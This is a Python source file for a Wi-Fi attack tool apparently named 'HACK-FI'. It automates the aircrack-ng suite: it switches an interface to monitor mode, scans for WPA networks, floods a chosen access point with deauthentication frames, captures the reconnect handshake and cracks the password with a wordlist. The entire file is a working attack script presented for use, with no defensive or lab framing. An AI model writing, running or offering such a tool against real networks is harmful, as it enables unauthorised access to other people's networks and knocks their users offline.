import os
import subprocess
import pandas as pd
from threading import Thread
import glob
import re
import argparse
import time


def banner():
    ban = '''

██╗░░██╗░█████╗░░█████╗░██╗░░██╗░░░░░░███████╗██╗
██║░░██║██╔══██╗██╔══██╗██║░██╔╝░░░░░░██╔════╝██║
███████║███████║██║░░╚═╝█████═╝░█████╗█████╗░░██║
██╔══██║██╔══██║██║░░██╗██╔═██╗░╚════╝██╔══╝░░██║
██║░░██║██║░░██║╚█████╔╝██║░╚██╗░░░░░░██║░░░░░██║
╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝░░░░░░╚═╝░░░░░╚═╝


Author: Nitin Choudhury
Version: 0.1.0
    '''

    print(ban)


class Interface:

    def __init__(self, interface):
        self.iface = interface

    def checkMode(self):
        ifaceinfo = subprocess.check_output(f"sudo iwconfig {self.iface}", shell=True).decode()
        mode = re.findall("(?:Mode:)([a-zA-Z]+)", ifaceinfo)[0]

        return mode.lower()

    def enableMonitorMode(self):

        if self.checkMode()=="managed":
            subprocess.call([f"sudo ifconfig {self.iface} down"], shell=True)
            subprocess.call([f"sudo iwconfig {self.iface} mode monitor"], shell=True)
            subprocess.call([f"sudo ifconfig {self.iface} up"], shell=True)

        if self.checkMode()=="monitor":
            return True
        else:
            return False



    def disableMonitorMode(self):

        if self.checkMode()=="managed":
            subprocess.call([f"sudo ifconfig {self.iface} down"], shell=True)
            subprocess.call([f"sudo iwconfig {self.iface} mode managed"], shell=True)
            subprocess.call([f"sudo ifconfig {self.iface} up"], shell=True)

        if self.checkMode()=="monitor":
            return True
        else:
            return False


    def startNetManager(self):
        subprocess.call(["sudo systemctl start NetworkManager"], shell=True)


class Capture:

    def __init__(self, interface):
        self.iface = interface

    def setenv(self):
        if "./tmp" not in glob.glob("./*"):
            os.mkdir("./tmp")

    def captureWPA(self):
        self.setenv()

        cmd = f"sudo xterm -e /bin/bash -c -l 'airodump-ng -w tmp/airodump --output-format csv {self.iface}'"
        os.system(cmd)

        latest = sorted(glob.glob("tmp/airodump-*.csv"))[-1]
        networkDF = pd.read_csv(f"{latest}", usecols=['BSSID', ' ESSID', ' channel', ' Privacy'])
        networkDF = networkDF[networkDF[' Privacy'].str.contains('WPA')]

        return networkDF

    def extractInfo(self, index, networkDF):
        info = networkDF.iloc[index]

        BSSID = info['BSSID']
        ESSID = info[' ESSID']
        CH = info[' channel']

        return (BSSID, ESSID, CH)

    def deauth(self, bssid):
        cmd = f"sudo xterm -e /bin/bash -c -l 'aireplay-ng --deauth 10 -a {bssid} {self.iface}'"
        os.system(cmd)

    def monHandshake(self, bssid, channel):
        cmd = f"sudo xterm -e /bin/bash -c -l 'airodump-ng -w tmp/handshake-{bssid} --output-format cap -c {channel} --bssid {bssid} {self.iface}'"
        os.system(cmd)

    def grabCAP(self, bssid, channel):
        t1 = Thread(target=self.monHandshake, args=(bssid, channel,))
        t2 = Thread(target=self.deauth, args=(bssid,))

        t1.start()
        time.sleep(3)
        t2.start()

        t2.join()
        t1.join()


class Cracker:

    def __init__(self, wordlist, BSSID):
        self.wordlist = wordlist
        self.BSSID = BSSID

    def getHandshakeFile(self):
        handshake_file = sorted(glob.glob(f"./tmp/handshake-{self.BSSID}-*.cap"))[-1]

        return handshake_file

    def aircrack(self):
        handshake_file = self.getHandshakeFile()
        crack_cmd = f"xterm -e /bin/bash -c -l 'aircrack-ng {handshake_file} -w {self.wordlist} -l ./tmp/password'"
        os.system(crack_cmd)

        if "./tmp/password" in glob.glob("./tmp/password"):
            passF = open("./tmp/password", "r")
            password = passF.read()
            passF.close()

            os.remove("./tmp/password")

            return password

        else:
            return None


def runner(interface, wordlist):
    ifacectrl = Interface(interface=interface)
    capture = Capture(interface=interface)

    monitor_mode = ifacectrl.enableMonitorMode()
    if monitor_mode:
        print("[+] Monitor Mode Enabled")
        print("Press Ctrl+C when you see the ESSID of the network in the XTERM window\n\n")
        net_df = capture.captureWPA()
        print(net_df)

        index = int(input("\nEnter ESSID Index >> "))
        bssid, essid, channel = capture.extractInfo(index=index, networkDF=net_df)

        print(f"\nPress Ctrl+C when you see [ WPA Hanshake: {bssid}")
        capture.grabCAP(bssid=bssid, channel=channel)

        cracker = Cracker(wordlist=wordlist, BSSID=bssid)
        print("[+] Cracking Password")
        password = cracker.aircrack()
        if password:
            print(f"\n\n[ ***KEY FOUND FOR {essid}: {password} ]\n\n".center(os.get_terminal_size().columns))

        else:
            print("[-] Sorry, Unable to find the key!")

        managed_mode = ifacectrl.disableMonitorMode()
        if managed_mode:
            print("[+] Monitor Mode Disabled")

        else:
            print("[!] Please Manually Disable Monitor Mode")

    else:
        print("[!] Unable to start Monitor Mode")

    ifacectrl.startNetManager()


if __name__ == '__main__':

    banner()

    if os.name=="posix":
        parser = argparse.ArgumentParser()

        parser.add_argument(
            '-i', '--interface',
            type=str,
            help="Set Interface",
            required=True
        )

        parser.add_argument(
            '-w', '--wordlist',
            type=str,
            help="Set wordlist for cracking password",
            required=True
        )

        args = parser.parse_args()

        interface = args.interface
        wordlist = args.wordlist

        runner(interface=interface, wordlist=wordlist)

    else:
        print("Sorry, this program is developed for Linux based environment only!")
